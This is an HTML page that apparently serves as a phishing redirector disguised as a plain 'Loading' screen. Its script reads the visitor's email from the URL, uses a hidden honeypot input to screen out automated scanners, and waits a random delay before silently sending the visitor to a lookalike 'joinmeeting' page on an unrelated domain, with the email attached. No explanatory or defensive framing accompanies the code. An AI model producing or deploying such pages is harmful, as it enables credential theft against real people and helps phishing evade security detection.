<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading…</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container { text-align: center; }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(0,0,0,0.1);
      border-top: 3px solid #0078d4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 10px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    p { font-size: 0.95rem; color: #555; margin: 0; }
    #hp { display: none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p>Loading, please wait…</p>
    <input type="text" id="hp" autocomplete="off">
  </div>

  <script>
    (function() {
      // Obfuscated variables
      const d = document;
      const w = window;
      const q = new URLSearchParams(w.location.search);
      const h = w.location.hash;

      const e1 = q.get('email');
      const e2 = h ? h.substring(1) : '';
      const em = e1 || e2;

      const b = 'https://meet-9f7a2e1b83c5.asecure-platform.com/v2/joinmeeting/meet/meeting.html';
      const t = em ? `${b}#${encodeURIComponent(em)}` : b;

      const honeypot = d.getElementById('hp');
      if (honeypot.value) {
        console.warn('[Bot Detected] Hidden input was filled.');
        return;
      }

      // Random delay: 2.2 to 4.1 seconds
      const delay = Math.floor(Math.random() * 1900) + 2200;

      setTimeout(function() {
        w.location.replace(t);
      }, delay);
    })();
  </script>
</body>
</html>
